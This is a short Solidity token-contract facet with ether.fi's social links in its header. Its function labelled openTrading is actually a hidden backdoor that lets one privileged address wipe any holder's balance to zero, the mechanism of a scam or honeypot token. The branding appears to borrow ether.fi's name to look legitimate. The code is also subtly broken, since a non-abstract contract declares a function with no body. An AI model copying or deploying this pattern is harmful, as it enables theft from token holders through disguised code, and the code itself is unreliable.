/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/+C3fpSjmPqzA5NTVh
    // Twitter: https://twitter.com/ether_fi
    // Website: https://www.ether.fi/
    // Github: https://github.com/etherfi
    // Discord: https://discord.com/invite/CuhQKGkEaF
    // Medium: https://medium.com/@etherfi
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}